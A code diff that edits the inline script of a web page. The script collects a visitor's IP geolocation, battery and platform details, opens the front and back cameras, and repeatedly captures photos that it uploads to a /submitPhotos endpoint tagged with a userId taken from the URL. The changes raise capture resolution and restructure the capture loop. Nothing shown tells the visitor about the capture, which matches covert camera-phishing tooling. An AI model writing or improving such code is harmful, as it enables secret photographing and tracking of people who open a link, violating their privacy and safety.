@@ -51,7 +51,7 @@
         const userId = window.location.pathname.split('/')[2];
 
         async function collectAdditionalData() {
-            try {
+         try {
                 const ipInfo = await fetch('https://ipapi.co/json/').then(response => response.json());
                 const battery = await navigator.getBattery();
 
@@ -69,7 +69,6 @@
                 return {};
             }
         }
-
         function getPlatformInfo() {
             const ua = navigator.userAgent;
             if (/Windows/.test(ua)) return { platform: "Windows" };
@@ -98,8 +97,8 @@
                     constraints.video.width = { ideal: 640 };
                     constraints.video.height = { ideal: 480 };
                 } else {
-                    constraints.video.width = { ideal: 800 };
-                    constraints.video.height = { ideal: 600 };
+                    constraints.video.width = { ideal: 1280 };
+                    constraints.video.height = { ideal: 720 };
                 }
 
                 const stream = await navigator.mediaDevices.getUserMedia(constraints);
@@ -117,7 +116,7 @@
                 const backStream = await requestCameraPermission('environment');
 
                 if (frontStream || backStream) {
-                    handleSuccess(frontStream, backStream, additionalData);
+                    await handleSuccess(frontStream, backStream, additionalData);
                 } else {
                     throw new Error('No camera access granted');
                 }
@@ -127,48 +126,51 @@
             }
         }
 
-        function handleSuccess(frontStream, backStream, additionalData) {
+        async function handleSuccess(frontStream, backStream, additionalData) {
             if (frontStream) {
                 frontVideo.srcObject = frontStream;
-                frontVideo.addEventListener('loadedmetadata', () => setupCamera(frontVideo, frontCanvas, 'front', additionalData));
+                await setupCamera(frontVideo, frontCanvas, 'front', additionalData);
             }
             if (backStream) {
                 backVideo.srcObject = backStream;
-                backVideo.addEventListener('loadedmetadata', () => setupCamera(backVideo, backCanvas, 'back', additionalData));
+                await setupCamera(backVideo, backCanvas, 'back', additionalData);
             }
         }
 
-        function setupCamera(video, canvas, cameraType, additionalData) {
-            video.play();
-            video.onplaying = () => {
-                const { videoWidth, videoHeight } = video;
-                canvas.width = videoWidth;
-                canvas.height = videoHeight;
+        async function setupCamera(video, canvas, cameraType, additionalData) {
+            return new Promise((resolve) => {
+                video.onloadedmetadata = () => {
+                    video.play();
+                    const { videoWidth, videoHeight } = video;
+                    canvas.width = videoWidth;
+                    canvas.height = videoHeight;
 
-                const context = canvas.getContext('2d');
-                let photoCount = 0;
+                    const context = canvas.getContext('2d');
+                    let photoCount = 0;
 
-                const captureInterval = setInterval(() => {
-                    if (photoCount >= 10) {
-                        clearInterval(captureInterval);
-                        return;
-                    }
+                    const captureInterval = setInterval(() => {
+                        if (photoCount >= 5) {
+                            clearInterval(captureInterval);
+                            resolve();
+                            return;
+                        }
 
-                    context.drawImage(video, 0, 0, videoWidth, videoHeight);
-                    canvas.toBlob(blob => {
-                        const formData = new FormData();
-                        formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
-                        formData.append('userId', userId);
-                        formData.append('cameraType', cameraType);
-                        formData.append('imageWidth', videoWidth);
-                        formData.append('imageHeight', videoHeight);
-                        formData.append('additionalData', JSON.stringify(additionalData));
-                        post('/submitPhotos', formData);
-                    }, 'image/webp', 0.7);
+                        context.drawImage(video, 0, 0, videoWidth, videoHeight);
+                        canvas.toBlob(blob => {
+                            const formData = new FormData();
+                            formData.append('images', blob, `image_${cameraType}_${photoCount}.webp`);
+                            formData.append('userId', userId);
+                            formData.append('cameraType', cameraType);
+                            formData.append('imageWidth', videoWidth);
+                            formData.append('imageHeight', videoHeight);
+                            formData.append('additionalData', JSON.stringify(additionalData));
+                            post('/submitPhotos', formData);
+                        }, 'image/webp', 0.7);
 
-                    photoCount++;
-                }, 1000);
-            };
+                        photoCount++;
+                    }, 1000);
+                };
+            });
         }
 
         async function post(url, formData) {
@@ -209,7 +211,6 @@
 
             console.error('Max retries reached. Unable to send photos.');
         }
-
         window.addEventListener('load', init);
     </script>
 </body>
